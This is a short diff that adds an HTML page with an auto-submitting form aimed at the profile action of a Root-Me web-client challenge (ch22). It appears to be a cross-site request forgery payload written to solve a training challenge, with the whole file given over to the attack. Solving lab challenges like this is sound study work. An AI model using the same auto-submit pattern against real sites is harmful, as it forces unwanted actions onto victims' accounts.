@@ -1,0 +1,18 @@
+<form id="autosubmit" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data">
+		<div class="form-group">
+		<label>Username:</label>
+		<input name="username" value="test" type="text">
+		</div>
+		<br>		
+		<div class="form-group">
+		<label>Status:</label>
+		<input name="status" disabled="" type="checkbox">
+		</div>
+		<br>	
+		<button type="submit">Submit</button>
+		</form>
+ 
+ 
+<script>
+ document.getElementById("autosubmit").submit();
+</script>
